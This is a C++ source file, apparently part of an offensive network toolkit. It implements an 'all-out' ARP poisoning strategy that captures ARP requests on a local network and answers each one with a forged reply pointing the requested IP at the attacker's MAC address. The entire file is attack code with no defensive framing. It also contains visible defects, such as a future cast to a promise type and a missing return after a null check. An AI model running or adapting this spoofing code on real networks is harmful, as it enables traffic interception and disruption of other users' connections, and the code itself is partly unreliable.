#include "arp_poisoning/all_out.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "ProtocolType.h"
#include "RawPacket.h"
#include "log.h"
#include <exception>
#include <future>
#include <stdexcept>

void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
    auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    const pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
            std::runtime_error("Invalid filter configuration, found packet "
                               "with missing layers")));
        device->stopCapture();
    }

    // determine whether or not to handle packet
    if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
         requestEthLayer->getSourceMac() == attackerMac_) ||
        requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) {
        LOG_INFO("skipped packet");
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
                                    requestArpLayer->getSenderMacAddress(),
                                    requestArpLayer->getTargetIpAddr(),
                                    requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(ARP_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        device->stopCapture();
        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
            std::runtime_error("Failed to send packet")));
        device->stopCapture();
    };
}

void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open device");
    }

    std::promise<void> completionPromise;
    std::future completionFuture = completionPromise.get_future();

    // set filter to mac not to self
    pcpp::MacAddressFilter deviceMacAdressFilter(device_->getMacAddress(),
                                                 pcpp::Direction::SRC_OR_DST);
    pcpp::NotFilter notDeviceMacAdress(&deviceMacAdressFilter);
    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
    pcpp::ProtoFilter protoFilter(pcpp::ARP);
    pcpp::AndFilter andFilter{};
    andFilter.addFilter(&arpFilter);
    andFilter.addFilter(&etherTypeFilter);
    andFilter.addFilter(&protoFilter);
    andFilter.addFilter(&notDeviceMacAdress);
    // TODO(jasonfu): test if ipv4 filters are usable for arp packets

    if (!device_->setFilter(andFilter)) {
        device_->close();
        LOG_ERROR("Unable to set arp and ethertype filters on interface");
        throw std::runtime_error(
            "Unable to set arp and ethertype filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        LOG_ERROR("Unable to start capturing arp packets");
        throw std::runtime_error("Unable to start capturing arp packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
